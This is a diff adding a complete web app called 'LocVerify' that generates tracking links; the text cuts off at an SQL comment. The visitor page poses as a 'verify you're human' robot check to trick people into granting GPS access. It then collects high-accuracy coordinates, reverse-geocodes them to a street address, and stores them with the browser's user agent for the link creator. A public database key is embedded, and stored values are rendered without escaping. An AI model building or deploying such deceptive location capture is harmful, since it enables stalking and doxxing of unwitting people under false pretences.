@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>crazy!!!</title>
+    <meta name="description" content="crazy!!!" />
+    <meta property="og:title" content="crazy!!!" />
+    <meta property="og:description" content="crazy!!!" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="crazy!!!" />
+    <meta name="twitter:description" content="crazy!!!" />
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📍</text></svg>" />
+
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+      :root {
+        --bg: #0f1117;
+        --surface: #1a1d27;
+        --surface2: #22263a;
+        --border: #2e3348;
+        --accent: #5b6af0;
+        --accent-hover: #4a59e0;
+        --accent-light: #5b6af015;
+        --green: #22c55e;
+        --red: #ef4444;
+        --yellow: #f59e0b;
+        --text: #e8eaf0;
+        --text-muted: #8891a8;
+        --text-dim: #555e7a;
+        --radius: 10px;
+        --radius-sm: 6px;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        line-height: 1.5;
+      }
+
+      #app {
+        width: 100%;
+        max-width: 520px;
+      }
+
+      /* ── BRAND ── */
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 28px;
+      }
+      .brand-icon {
+        width: 36px; height: 36px;
+        background: var(--accent);
+        border-radius: 8px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 18px;
+      }
+      .brand-name {
+        font-size: 17px;
+        font-weight: 700;
+        color: var(--text);
+        letter-spacing: -0.3px;
+      }
+      .brand-sub {
+        font-size: 12px;
+        color: var(--text-muted);
+        margin-top: 1px;
+      }
+
+      /* ── CARD ── */
+      .card {
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 28px;
+      }
+
+      .card-title {
+        font-size: 20px;
+        font-weight: 700;
+        letter-spacing: -0.4px;
+        margin-bottom: 6px;
+      }
+      .card-desc {
+        font-size: 13.5px;
+        color: var(--text-muted);
+        margin-bottom: 24px;
+        line-height: 1.55;
+      }
+
+      /* ── FORM ── */
+      label {
+        display: block;
+        font-size: 12.5px;
+        font-weight: 600;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.6px;
+        margin-bottom: 7px;
+      }
+      input[type="text"], input[type="url"] {
+        width: 100%;
+        background: var(--surface2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 10px 13px;
+        font-size: 14px;
+        color: var(--text);
+        outline: none;
+        transition: border-color .15s;
+        font-family: inherit;
+      }
+      input[type="text"]:focus, input[type="url"]:focus {
+        border-color: var(--accent);
+        box-shadow: 0 0 0 3px var(--accent-light);
+      }
+      input::placeholder { color: var(--text-dim); }
+
+      /* ── BUTTON ── */
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 7px;
+        padding: 10px 18px;
+        font-size: 14px;
+        font-weight: 600;
+        font-family: inherit;
+        border: none;
+        border-radius: var(--radius-sm);
+        cursor: pointer;
+        transition: background .15s, opacity .15s, transform .1s;
+        letter-spacing: 0.1px;
+      }
+      .btn:active { transform: scale(.98); }
+      .btn:disabled { opacity: .55; cursor: not-allowed; transform: none; }
+      .btn-primary {
+        background: var(--accent);
+        color: #fff;
+        width: 100%;
+        padding: 12px;
+        font-size: 14.5px;
+        margin-top: 18px;
+      }
+      .btn-primary:hover:not(:disabled) { background: var(--accent-hover); }
+      .btn-secondary {
+        background: var(--surface2);
+        color: var(--text);
+        border: 1px solid var(--border);
+      }
+      .btn-secondary:hover:not(:disabled) { border-color: var(--accent); color: var(--accent); }
+
+      /* ── RESULT BOX ── */
+      .result-box {
+        margin-top: 20px;
+        background: var(--surface2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 14px 16px;
+        display: none;
+      }
+      .result-label {
+        font-size: 11px;
+        font-weight: 600;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.7px;
+        margin-bottom: 8px;
+      }
+      .result-link-row {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .result-link {
+        flex: 1;
+        font-size: 13.5px;
+        font-family: 'SF Mono', 'Fira Code', monospace;
+        color: var(--accent);
+        word-break: break-all;
+        background: var(--bg);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 8px 11px;
+      }
+      .copy-btn {
+        flex-shrink: 0;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 8px 12px;
+        font-size: 12px;
+        color: var(--text-muted);
+        cursor: pointer;
+        font-family: inherit;
+        transition: border-color .15s, color .15s;
+      }
+      .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+      /* ── LINKS TABLE ── */
+      .links-section { margin-top: 28px; }
+      .section-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 12px;
+      }
+      .section-title {
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+      .badge {
+        font-size: 11px;
+        font-weight: 600;
+        background: var(--accent-light);
+        color: var(--accent);
+        border: 1px solid var(--accent);
+        border-radius: 20px;
+        padding: 2px 8px;
+      }
+      .link-item {
+        background: var(--surface2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 12px 14px;
+        margin-bottom: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        transition: border-color .15s;
+      }
+      .link-item:hover { border-color: var(--accent); }
+      .link-item-info { flex: 1; min-width: 0; }
+      .link-item-id {
+        font-size: 13px;
+        font-family: 'SF Mono', 'Fira Code', monospace;
+        color: var(--accent);
+        font-weight: 600;
+      }
+      .link-item-url {
+        font-size: 12px;
+        color: var(--text-muted);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        margin-top: 2px;
+      }
+      .link-item-stats {
+        text-align: right;
+        flex-shrink: 0;
+      }
+      .link-item-count {
+        font-size: 14px;
+        font-weight: 700;
+        color: var(--text);
+      }
+      .link-item-count-label {
+        font-size: 11px;
+        color: var(--text-dim);
+      }
+      .empty-state {
+        text-align: center;
+        padding: 24px;
+        color: var(--text-dim);
+        font-size: 13.5px;
+      }
+
+      /* ── LINK ITEM EXPANDABLE ── */
+      .link-card {
+        background: var(--surface2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        margin-bottom: 8px;
+        overflow: hidden;
+        transition: border-color .15s;
+      }
+      .link-card.open { border-color: var(--accent); }
+      .link-card-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        padding: 12px 14px;
+        cursor: pointer;
+        user-select: none;
+      }
+      .link-card-header:hover .link-item-id { color: #818cf8; }
+      .link-item-info { flex: 1; min-width: 0; }
+      .link-item-id {
+        font-size: 13px;
+        font-family: 'SF Mono', 'Fira Code', monospace;
+        color: var(--accent);
+        font-weight: 600;
+        transition: color .15s;
+      }
+      .link-item-url {
+        font-size: 12px;
+        color: var(--text-muted);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        margin-top: 2px;
+      }
+      .link-item-right {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        flex-shrink: 0;
+      }
+      .link-item-stats {
+        text-align: right;
+      }
+      .link-item-count {
+        font-size: 14px;
+        font-weight: 700;
+        color: var(--text);
+      }
+      .link-item-count-label {
+        font-size: 11px;
+        color: var(--text-dim);
+      }
+      .chevron {
+        font-size: 11px;
+        color: var(--text-dim);
+        transition: transform .2s;
+      }
+      .link-card.open .chevron { transform: rotate(180deg); }
+
+      /* ── LOCATIONS PANEL ── */
+      .locations-panel {
+        display: none;
+        border-top: 1px solid var(--border);
+        padding: 12px 14px;
+        background: var(--bg);
+      }
+      .link-card.open .locations-panel { display: block; }
+      .loc-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 10px;
+      }
+      .loc-label {
+        font-size: 11px;
+        font-weight: 600;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.6px;
+      }
+      .loc-copy-link-btn {
+        font-size: 11px;
+        color: var(--accent);
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-family: inherit;
+        padding: 2px 6px;
+        border-radius: 4px;
+        transition: background .15s;
+      }
+      .loc-copy-link-btn:hover { background: var(--accent-light); }
+      .loc-delete-btn {
+        font-size: 11px;
+        color: #f87171;
+        background: none;
+        border: 1px solid rgba(239,68,68,.3);
+        cursor: pointer;
+        font-family: inherit;
+        padding: 2px 8px;
+        border-radius: 4px;
+        transition: background .15s, color .15s;
+      }
+      .loc-delete-btn:hover { background: rgba(239,68,68,.08); color: #ef4444; }
+      .loc-delete-btn:disabled { opacity: .5; cursor: not-allowed; }
+      .loc-entry {
+        background: var(--surface2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius-sm);
+        padding: 10px 12px;
+        margin-bottom: 7px;
+        font-size: 12.5px;
+      }
+      .loc-entry:last-child { margin-bottom: 0; }
+      .loc-entry-top {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 6px;
+      }
+      .loc-num {
+        font-size: 11px;
+        font-weight: 700;
+        color: var(--text-dim);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+      .loc-time {
+        font-size: 11px;
+        color: var(--text-dim);
+      }
+      .loc-coords {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 6px 12px;
+        margin-bottom: 8px;
+      }
+      .loc-field label {
+        font-size: 10px;
+        font-weight: 600;
+        color: var(--text-dim);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        display: block;
+        margin-bottom: 2px;
+      }
+      .loc-field span {
+        font-size: 13px;
+        font-weight: 600;
+        font-family: 'SF Mono', 'Fira Code', monospace;
+        color: var(--text);
+      }
+      .loc-address {
+        font-size: 13px;
+        color: var(--text);
+        line-height: 1.5;
+        margin-bottom: 8px;
+        word-break: break-word;
+      }
+      .loc-accuracy {
+        font-size: 11.5px;
+        color: var(--text-muted);
+        margin-bottom: 8px;
+      }
+      .loc-map-btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 12px;
+        color: var(--accent);
+        background: var(--accent-light);
+        border: 1px solid rgba(91,106,240,.25);
+        border-radius: 4px;
+        padding: 4px 10px;
+        text-decoration: none;
+        font-weight: 500;
+        transition: background .15s;
+      }
+      .loc-map-btn:hover { background: rgba(91,106,240,.15); }
+      .loc-empty {
+        text-align: center;
+        padding: 16px;
+        color: var(--text-dim);
+        font-size: 13px;
+      }
+
+      /* ── VISITOR PAGE ── */
+      body.visitor-mode {
+        background: #fff;
+      }
+      .visitor-page {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        text-align: center;
+        padding: 40px 24px;
+        background: #fff;
+        color: #111;
+      }
+      .v-shield {
+        width: 72px; height: 72px;
+        background: #f4f4f4;
+        border-radius: 50%;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 34px;
+        margin-bottom: 24px;
+      }
+      .v-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #111;
+        letter-spacing: -0.5px;
+        margin-bottom: 10px;
+      }
+      .v-sub {
+        font-size: 15px;
+        color: #555;
+        line-height: 1.6;
+        max-width: 320px;
+        margin-bottom: 32px;
+      }
+      .v-allow-hint {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: #f9f9f9;
+        border: 1px solid #e5e5e5;
+        border-radius: 10px;
+        padding: 14px 20px;
+        font-size: 14px;
+        color: #333;
+        font-weight: 500;
+        max-width: 340px;
+        margin-bottom: 28px;
+      }
+      .v-allow-hint .arrow {
+        font-size: 20px;
+        animation: bounce-up .9s ease-in-out infinite;
+      }
+      @keyframes bounce-up {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-5px); }
+      }
+      .v-spinner-wrap {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #555;
+        font-size: 14px;
+        margin-bottom: 24px;
+      }
+      .v-spinner {
+        width: 18px; height: 18px;
+        border: 2px solid #ddd;
+        border-top-color: #333;
+        border-radius: 50%;
+        animation: spin .7s linear infinite;
+        flex-shrink: 0;
+      }
+      .v-status {
+        font-size: 14px;
+        padding: 12px 20px;
+        border-radius: 8px;
+        max-width: 340px;
+        display: none;
+        margin-bottom: 16px;
+      }
+      .v-status.show { display: block; }
+      .v-status.err { background: #fff1f1; border: 1px solid #fca5a5; color: #b91c1c; }
+      .v-status.ok  { background: #f0fdf4; border: 1px solid #86efac; color: #166534; }
+      .v-status.wait { background: #f0f9ff; border: 1px solid #bae6fd; color: #0369a1; }
+      .v-branding {
+        margin-top: 40px;
+        font-size: 12px;
+        color: #bbb;
+      }
+      .v-branding strong { color: #999; }
+
+      /* ── STATUS STATES ── */
+      .status-msg {
+        margin-top: 16px;
+        padding: 12px 16px;
+        border-radius: var(--radius-sm);
+        font-size: 13.5px;
+        display: none;
+        align-items: center;
+        gap: 8px;
+      }
+      .status-msg.show { display: flex; }
+      .status-msg.error { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.3); color: #f87171; }
+      .status-msg.success { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.3); color: #4ade80; }
+      .status-msg.info { background: var(--accent-light); border: 1px solid rgba(91,106,240,.3); color: #818cf8; }
+
+      /* ── SPINNER ── */
+      @keyframes spin { to { transform: rotate(360deg); } }
+      .spinner {
+        width: 16px; height: 16px;
+        border: 2px solid rgba(255,255,255,.2);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin .7s linear infinite;
+        flex-shrink: 0;
+      }
+
+      /* ── DIVIDER ── */
+      .divider {
+        border: none;
+        border-top: 1px solid var(--border);
+        margin: 22px 0;
+      }
+
+      /* ── FOOTER NOTE ── */
+      .footer-note {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 12px;
+        color: var(--text-dim);
+      }
+
+      /* ── RESPONSIVE ── */
+      @media (max-width: 540px) {
+        .card { padding: 20px; }
+        .result-link-row { flex-direction: column; }
+        .result-link { width: 100%; }
+        .copy-btn { width: 100%; text-align: center; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="app"></div>
+
+    <script>
+      /* ── SUPABASE CONFIG ── */
+      const SUPABASE_URL = 'https://shwanvkwdwwnaltekazm.supabase.co/rest/v1';
+      const SUPABASE_KEY = 'sb_publishable_fNMBOQIyICNcSxBWnBdhoQ_yilSevlb';
+      const HEADERS = {
+        'apikey': SUPABASE_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      };
+
+      /* ── HELPERS ── */
+      function randomId() {
+        return Math.random().toString(36).slice(2, 9) + Math.random().toString(36).slice(2, 6);
+      }
+
+      function getBasePath() {
+        // Works in both dev (/) and any BASE_PATH deployment
+        const base = document.querySelector('base') ? document.querySelector('base').href : '/';
+        try { return new URL(base).pathname; } catch(e) { return '/'; }
+      }
+
+      function getPath() {
+        return window.location.pathname;
+      }
+
+      function extractLinkId(path) {
+        const m = path.match(/\/v\/([^/?#]+)/);
+        return m ? m[1] : null;
+      }
+
+      async function sbGet(table, filter) {
+        const res = await fetch(SUPABASE_URL + '/' + table + '?' + filter, { headers: { ...HEADERS, 'Prefer': '' } });
+        if (!res.ok) throw new Error(await res.text());
+        return res.json();
+      }
+
+      async function sbPost(table, data) {
+        const res = await fetch(SUPABASE_URL + '/' + table, {
+          method: 'POST',
+          headers: { ...HEADERS, 'Prefer': 'return=representation' },
+          body: JSON.stringify(data)
+        });
+        if (!res.ok) throw new Error(await res.text());
+        return res.json();
+      }
+
+      async function sbPatch(table, filter, data) {
+        const res = await fetch(SUPABASE_URL + '/' + table + '?' + filter, {
+          method: 'PATCH',
+          headers: HEADERS,
+          body: JSON.stringify(data)
+        });
+        if (!res.ok) throw new Error(await res.text());
+      }
+
+      /* ── SUPABASE API ── */
+      async function createLink(redirectUrl) {
+        const id = randomId();
+        await sbPost('links', {
+          id,
+          redirect_url: redirectUrl,
+          locations: [],
+          created_at: new Date().toISOString()
+        });
+        return id;
+      }
+
+      async function getLink(id) {
+        const rows = await sbGet('links', 'id=eq.' + encodeURIComponent(id) + '&select=*&limit=1');
+        return rows[0] || null;
+      }
+
+      async function appendLocation(linkId, locData) {
+        // Fetch current locations, append, then update
+        const link = await getLink(linkId);
+        if (!link) throw new Error('Link not found');
+        const locations = Array.isArray(link.locations) ? link.locations : [];
+        locations.push(locData);
+        await sbPatch('links', 'id=eq.' + encodeURIComponent(linkId), { locations });
+      }
+
+      async function listLinks() {
+        return sbGet('links', 'select=*&order=created_at.desc&limit=50');
+      }
+
+      /* ── ROUTER ── */
+      function route() {
+        const path = getPath();
+        const linkId = extractLinkId(path);
+        const app = document.getElementById('app');
+        if (linkId) {
+          renderVisitor(app, linkId);
+        } else {
+          renderDashboard(app);
+        }
+      }
+
+      /* ══════════════════════════════════════════
+         CREATOR DASHBOARD
+      ══════════════════════════════════════════ */
+      function renderDashboard(app) {
+        app.innerHTML = `
+          <div class="brand">
+            <div class="brand-icon">📍</div>
+            <div>
+              <div class="brand-name">LocVerify</div>
+              <div class="brand-sub">Location Verification Link Generator</div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-title">Generate a Link</div>
+            <div class="card-desc">Create a trackable link. When a visitor opens it, they are asked to share their location before being redirected.</div>
+
+            <label for="redirectUrl">Redirect URL</label>
+            <input type="url" id="redirectUrl" placeholder="https://example.com" autocomplete="off" />
+
+            <button class="btn btn-primary" id="generateBtn" onclick="handleGenerate()">
+              Generate Link
+            </button>
+
+            <div class="result-box" id="resultBox">
+              <div class="result-label">Shareable Link</div>
+              <div class="result-link-row">
+                <div class="result-link" id="resultLink"></div>
+                <button class="copy-btn" onclick="copyLink()">Copy</button>
+              </div>
+            </div>
+
+            <div class="status-msg" id="dashStatus"></div>
+          </div>
+
+          <div class="links-section">
+            <div class="section-header">
+              <div class="section-title">Generated Links</div>
+              <div class="badge" id="linksCount">—</div>
+            </div>
+            <div id="linksList"><div class="empty-state">Loading links…</div></div>
+          </div>
+
+          <div class="footer-note">All location data is stored transparently and only after explicit consent.</div>
+        `;
+
+        loadLinks();
+
+        // enter key support
+        document.getElementById('redirectUrl').addEventListener('keydown', e => {
+          if (e.key === 'Enter') handleGenerate();
+        });
+      }
+
+      async function handleGenerate() {
+        const btn = document.getElementById('generateBtn');
+        const input = document.getElementById('redirectUrl');
+        const status = document.getElementById('dashStatus');
+        const resultBox = document.getElementById('resultBox');
+
+        const url = input.value.trim();
+        if (!url) {
+          showStatus(status, 'error', '⚠ Please enter a redirect URL.');
+          return;
+        }
+        if (!url.startsWith('http://') && !url.startsWith('https://')) {
+          showStatus(status, 'error', '⚠ URL must start with http:// or https://');
+          return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<div class="spinner"></div> Generating…';
+        hideStatus(status);
+        resultBox.style.display = 'none';
+
+        try {
+          const id = await createLink(url);
+          const link = window.location.origin + '/v/' + id;
+
+          document.getElementById('resultLink').textContent = link;
+          resultBox.style.display = 'block';
+          showStatus(status, 'success', '✓ Link created successfully!');
+          input.value = '';
+          loadLinks();
+        } catch (err) {
+          console.error(err);
+          showStatus(status, 'error', '⚠ Failed to create link. ' + (err.message || ''));
+        } finally {
+          btn.disabled = false;
+          btn.innerHTML = 'Generate Link';
+        }
+      }
+
+      async function loadLinks() {
+        const list = document.getElementById('linksList');
+        const countBadge = document.getElementById('linksCount');
+        try {
+          const rows = await listLinks();
+          if (!countBadge) return;
+          countBadge.textContent = rows.length;
+          if (rows.length === 0) {
+            list.innerHTML = '<div class="empty-state">No links yet. Generate your first one above.</div>';
+            return;
+          }
+          list.innerHTML = rows.map(r => {
+            const locs = Array.isArray(r.locations) ? r.locations : [];
+            const count = locs.length;
+            const shareLink = window.location.origin + '/v/' + r.id;
+
+            const locsHtml = count === 0
+              ? '<div class="loc-empty">📭 No location captures yet.</div>'
+              : locs.map((loc, i) => {
+                  const lat = typeof loc.latitude === 'number' ? loc.latitude.toFixed(6) : '—';
+                  const lng = typeof loc.longitude === 'number' ? loc.longitude.toFixed(6) : '—';
+                  const acc = typeof loc.accuracy === 'number' ? Math.round(loc.accuracy) + ' m' : '—';
+                  const ts = loc.timestamp ? new Date(loc.timestamp).toLocaleString() : '—';
+                  const mapsUrl = (loc.latitude && loc.longitude)
+                    ? 'https://www.google.com/maps?q=' + loc.latitude + ',' + loc.longitude
+                    : null;
+                  const address = loc.address || null;
+                  return `
+                    <div class="loc-entry">
+                      <div class="loc-entry-top">
+                        <span class="loc-num">Visit #${i + 1}</span>
+                        <span class="loc-time">${ts}</span>
+                      </div>
+                      ${address
+                        ? `<div class="loc-address">📍 ${address}</div>`
+                        : `<div class="loc-coords">
+                             <div class="loc-field"><label>Latitude</label><span>${lat}</span></div>
+                             <div class="loc-field"><label>Longitude</label><span>${lng}</span></div>
+                           </div>`
+                      }
+                      <div class="loc-accuracy">📡 Accuracy: <strong>${acc}</strong></div>
+                      ${mapsUrl ? `<a class="loc-map-btn" href="${mapsUrl}" target="_blank" rel="noopener">🗺️ Open in Google Maps</a>` : ''}
+                    </div>
+                  `;
+                }).join('');
+
+            return `
+              <div class="link-card" id="card-${r.id}">
+                <div class="link-card-header" onclick="toggleCard('${r.id}')">
+                  <div class="link-item-info">
+                    <div class="link-item-id">/v/${r.id}</div>
+                    <div class="link-item-url" title="${r.redirect_url}">${r.redirect_url}</div>
+                  </div>
+                  <div class="link-item-right">
+                    <div class="link-item-stats">
+                      <div class="link-item-count">${count}</div>
+                      <div class="link-item-count-label">visit${count !== 1 ? 's' : ''}</div>
+                    </div>
+                    <span class="chevron">▼</span>
+                  </div>
+                </div>
+                <div class="locations-panel">
+                  <div class="loc-header">
+                    <span class="loc-label">Captured Locations</span>
+                    <div style="display:flex;gap:8px;align-items:center">
+                      <button class="loc-copy-link-btn" onclick="event.stopPropagation(); copyToClipboard('${shareLink}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy link',1800)">Copy link</button>
+                      ${count > 0 ? `<button class="loc-delete-btn" onclick="event.stopPropagation(); clearVisits('${r.id}', this)">🗑 Clear history</button>` : ''}
+                    </div>
+                  </div>
+                  <div class="loc-entries" id="entries-${r.id}">${locsHtml}</div>
+                </div>
+              </div>
+            `;
+          }).join('');
+        } catch (err) {
+          console.error(err);
+          if (list) list.innerHTML = '<div class="empty-state" style="color:var(--red)">Failed to load links.</div>';
+        }
+      }
+
+      function toggleCard(id) {
+        const card = document.getElementById('card-' + id);
+        if (card) card.classList.toggle('open');
+      }
+
+      async function clearVisits(linkId, btn) {
+        if (!confirm('Clear all visit history for this link?')) return;
+        btn.disabled = true;
+        btn.textContent = 'Clearing…';
+        try {
+          await sbPatch('links', 'id=eq.' + encodeURIComponent(linkId), { locations: [] });
+          const entries = document.getElementById('entries-' + linkId);
+          if (entries) entries.innerHTML = '<div class="loc-empty">📭 No location captures yet.</div>';
+          btn.remove();
+          // update the visit count badge on the header
+          const card = document.getElementById('card-' + linkId);
+          if (card) {
+            const countEl = card.querySelector('.link-item-count');
+            const labelEl = card.querySelector('.link-item-count-label');
+            if (countEl) countEl.textContent = '0';
+            if (labelEl) labelEl.textContent = 'visits';
+          }
+        } catch (err) {
+          console.error(err);
+          btn.disabled = false;
+          btn.textContent = '🗑 Clear history';
+          alert('Failed to clear history.');
+        }
+      }
+
+      function copyLink() {
+        const link = document.getElementById('resultLink').textContent;
+        copyToClipboard(link);
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = 'Copied!';
+        btn.style.color = 'var(--green)';
+        setTimeout(() => { btn.textContent = 'Copy'; btn.style.color = ''; }, 2000);
+      }
+
+      function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).catch(() => {
+          const el = document.createElement('textarea');
+          el.value = text;
+          document.body.appendChild(el);
+          el.select();
+          document.execCommand('copy');
+          document.body.removeChild(el);
+        });
+      }
+
+      /* ══════════════════════════════════════════
+         VISITOR PAGE
+      ══════════════════════════════════════════ */
+      function renderVisitor(app, linkId) {
+        document.body.classList.add('visitor-mode');
+        app.innerHTML = `
+          <div class="visitor-page">
+            <div class="v-shield">🤖</div>
+            <div class="v-title">Verify you're human</div>
+            <div class="v-sub">A location permission popup will appear. Click <strong>Allow</strong> to continue.</div>
+
+            <div class="v-allow-hint" id="vHint">
+              <span class="arrow">☝️</span>
+              Click <strong style="margin:0 3px">Allow</strong> in the popup to verify you're not a robot
+            </div>
+
+            <div class="v-spinner-wrap" id="vSpinner" style="display:none">
+              <div class="v-spinner"></div>
+              Verifying location…
+            </div>
+
+            <div class="v-status" id="vStatus"></div>
+
+            <div class="v-branding">Secured by <strong>LocVerify</strong></div>
+          </div>
+        `;
+
+        setTimeout(() => startVisitorFlow(linkId), 4000);
+      }
+
+      function startVisitorFlow(linkId) {
+        if (!navigator.geolocation) {
+          setVStatus('err', 'Your browser does not support location sharing.');
+          return;
+        }
+
+        // Target: ≤20m accuracy. Max wait: 25 seconds. Take best reading found.
+        const TARGET_ACCURACY = 20;   // metres
+        const MAX_WAIT_MS     = 25000;
+
+        let bestPosition  = null;
+        let watchId       = null;
+        let settled       = false;
+
+        function updateSpinner(acc) {
+          const el = document.getElementById('vSpinner');
+          if (el) el.innerHTML = `<div class="v-spinner"></div> Locking GPS… (±${Math.round(acc)}m)`;
+        }
+
+        async function finalize(position) {
+          if (settled) return;
+          settled = true;
+          if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+
+          const hint = document.getElementById('vHint');
+          if (hint) hint.style.display = 'none';
+          const spin = document.getElementById('vSpinner');
+          if (spin) { spin.style.display = 'flex'; spin.innerHTML = '<div class="v-spinner"></div> Verifying…'; }
+
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const acc = position.coords.accuracy;
+
+          // Reverse geocode at building level (zoom=19)
+          let address = null;
+          try {
+            const geo = await fetch(
+              `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1&zoom=19`,
+              { headers: { 'Accept-Language': 'en', 'User-Agent': 'LocVerify/1.0' } }
+            );
+            if (geo.ok) {
+              const gj = await geo.json();
+              const a  = gj.address || {};
+              const parts = [
+                a.house_number,
+                a.road || a.pedestrian || a.footway || a.path,
+                a.neighbourhood || a.suburb || a.hamlet || a.village,
+                a.town || a.city || a.municipality,
+                a.state || a.county,
+                a.postcode,
+                a.country
+              ].filter(Boolean);
+              address = parts.length ? parts.join(', ') : (gj.display_name || null);
+            }
+          } catch (_) {}
+
+          const locData = {
+            latitude:  lat,
+            longitude: lng,
+            accuracy:  acc,
+            address,
+            timestamp:  new Date(position.timestamp).toISOString(),
+            user_agent: navigator.userAgent
+          };
+
+          try {
+            const link = await getLink(linkId);
+            if (!link) {
+              if (spin) spin.style.display = 'none';
+              setVStatus('err', 'This link does not exist or has expired.');
+              return;
+            }
+            await appendLocation(linkId, locData);
+            setVStatus('ok', '✓ Verified! Redirecting…');
+            setTimeout(() => { window.location.href = link.redirect_url; }, 700);
+          } catch (err) {
+            console.error(err);
+            if (spin) spin.style.display = 'none';
+            setVStatus('err', 'Something went wrong. Please try again.');
+          }
+        }
+
+        // watchPosition keeps firing with better fixes as GPS warms up
+        watchId = navigator.geolocation.watchPosition(
+          (pos) => {
+            const hint = document.getElementById('vHint');
+            if (hint) hint.style.display = 'none';
+            const spin = document.getElementById('vSpinner');
+            if (spin) spin.style.display = 'flex';
+
+            const acc = pos.coords.accuracy;
+            updateSpinner(acc);
+
+            // Keep the best (most accurate) reading so far
+            if (!bestPosition || acc < bestPosition.coords.accuracy) {
+              bestPosition = pos;
+            }
+
+            // If we hit target accuracy, finalize immediately
+            if (acc <= TARGET_ACCURACY) {
+              finalize(pos);
+            }
+          },
+          (err) => {
+            if (settled) return;
+            const hint = document.getElementById('vHint');
+            if (hint) hint.style.display = 'none';
+            let msg = 'Location access is required to continue.';
+            if (err.code === 1) msg = 'You blocked location access. Please allow it and refresh the page.';
+            else if (err.code === 2) msg = 'Location unavailable on this device.';
+            else if (err.code === 3) msg = 'Location timed out. Please refresh and try again.';
+            setVStatus('err', msg);
+          },
+          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+        );
+
+        // Hard deadline — use best reading we have after MAX_WAIT_MS
+        setTimeout(() => {
+          if (!settled && bestPosition) {
+            finalize(bestPosition);
+          } else if (!settled) {
+            settled = true;
+            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+            setVStatus('err', 'Could not get your location. Please try again.');
+          }
+        }, MAX_WAIT_MS);
+      }
+
+      function setVStatus(type, msg) {
+        const el = document.getElementById('vStatus');
+        if (!el) return;
+        el.className = 'v-status show ' + type;
+        el.textContent = msg;
+      }
+
+      /* ── STATUS HELPERS ── */
+      function showStatus(el, type, msg) {
+        if (!el) return;
+        el.className = 'status-msg show ' + type;
+        el.innerHTML = msg;
+      }
+      function hideStatus(el) {
+        if (!el) return;
+        el.className = 'status-msg';
+      }
+
+      /* ── INIT ── */
+      route();
+
+      // handle browser back/forward
+      window.addEventListener('popstate', route);
+    </script>
+
+    <!--
+    ════════════════════════════════════════════════════════
+    SQL: Create the Supabase table and policies
